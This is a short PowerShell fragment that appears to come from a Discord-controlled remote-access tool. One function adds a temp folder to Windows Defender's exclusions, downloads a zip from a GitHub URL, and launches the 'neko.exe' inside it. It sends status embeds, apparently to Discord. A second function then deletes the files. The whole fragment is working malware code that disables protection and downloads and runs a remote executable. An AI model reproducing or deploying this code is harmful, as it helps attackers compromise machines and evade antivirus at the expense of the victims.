function Mgetneko {
    $tempfolder  = "$env:temp\neko"
    Add-MpPreference -ExclusionPath $tempfolder
    $nekodownload = "https://github.com/JoshuaBrien/Compilation-of-stuff-i-done/raw/refs/heads/main/Coral_network_discordONLY/assets/neko.zip"
    $nekozip = "$tempfolder\neko.zip"
    if (!(Test-Path -Path $tempfolder)) {
        New-Item -ItemType Directory -Path $tempfolder | Out-Null
    }
    if (!(Test-Path -Path $nekozip)) {
        Iwr -Uri $nekodownload -OutFile $nekozip
    }
    Start-Sleep 1
    Expand-Archive -Path $nekozip -DestinationPath $tempfolder -Force
    Start-Sleep 1
    rm -Path $nekozip -Force
    $proc = "$tempfolder\neko.exe"
    
    Start-Process $proc -ArgumentList (".\neko.exe")
    sendEmbedWithImage -Title "NEKO CLIENT DOWNLOADED" -Description "meow!"
    Mremoveneko

}

function Mremoveneko {
    $tempfolder = "$env:temp\neko"
    sendEmbedWithImage -Title "NEKO CLIENT BEING REMOVED" -Description "Neko client files are being removed."
    if (Test-Path -Path $tempfolder) {
        rm -Path $tempfolder -Force -Recurse
        sendEmbedWithImage -Title "NEKO CLIENT REMOVED" -Description "Neko client files have been removed."
    }
}
